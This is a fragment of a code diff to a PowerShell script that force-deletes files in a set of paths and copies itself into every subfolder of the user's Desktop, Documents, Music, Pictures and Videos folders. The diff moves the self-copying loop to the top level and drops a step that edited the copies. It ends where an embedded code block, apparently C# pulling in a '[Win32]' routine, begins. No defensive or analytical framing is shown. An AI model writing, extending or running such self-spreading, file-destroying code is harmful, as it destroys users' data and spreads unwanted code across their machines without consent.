@@ -18,19 +18,14 @@ foreach ($path in $pathsToDelete) {
             Remove-Item -Path $filePath -Force
         }
     }
+}
 
-    $selfPath = $MyInvocation.MyCommand.Path
-    $folders = Get-ChildItem -Path $path -Directory -Recurse
+$selfPath = $MyInvocation.MyCommand.Path
+$foldersToCopy = Get-ChildItem -Path $desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath -Directory -Recurse
 
-    foreach ($folder in $folders) {
-        $newCopyPath = Join-Path -Path $folder.FullName -ChildPath $MyInvocation.MyCommand.Name
-        Copy-Item -Path $selfPath -Destination $newCopyPath -Force
-
-        # Modify the copied file's content to remove the code block related to copying itself
-        $copyContent = Get-Content -Path $newCopyPath -Raw
-        $copyContent = $copyContent -replace '(?s)(Add-Type.*\[Win32\]::ReversePIP\(\)\s*\})', ''
-        Set-Content -Path $newCopyPath -Value $copyContent
-    }
+foreach ($folder in $foldersToCopy) {
+    $newCopyPath = Join-Path -Path $folder.FullName -ChildPath $MyInvocation.MyCommand.Name
+    Copy-Item -Path $selfPath -Destination $newCopyPath -Force
 }
 
 $source = @"
